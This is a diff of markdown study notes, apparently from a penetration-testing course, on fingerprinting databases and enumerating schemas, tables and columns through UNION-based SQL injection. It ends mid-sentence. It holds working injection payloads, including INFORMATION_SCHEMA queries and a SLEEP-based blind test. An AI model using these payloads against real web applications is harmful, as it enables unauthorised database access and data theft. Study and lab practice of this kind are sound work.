@@ -82,5 +82,18 @@ Below is a list of payload we can use to identify what SQL we are dealing:
 |`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
 |`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
 |`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|
-Before we use union query to extract database, we first need to see the DB's structure, to do that we can first obtain info on INFORMATION_SCHEMA DB, the SCHEMATA table contains names of DB available in the server, so we can query it with something like
-:
+Before we use union query to extract database, we first need to see the DB's structure, to do that we can first obtain info on INFORMATION_SCHEMA DB, the SCHEMATA table contains names of DB available in the server, so we can query it with something like:
+```
+cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+#This just example, fill in until column number matches and locate columns that are displayed.
+```
+We can locate the current DB with select database() command, therefore the example command becomes:
+```
+cn' UNION select 1,database(),3,4-- -
+```
+
+Next, we can query the TABLES table in the INFORMATION_SCHEMA db to enumerate what table a db has, the TABLE_NAME contains table names while TABLE_SCHEMA tells us which db it is related to, the following example shows how to seek tables within database dev:
+```
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+```
+Finally, we can query what column a table has by
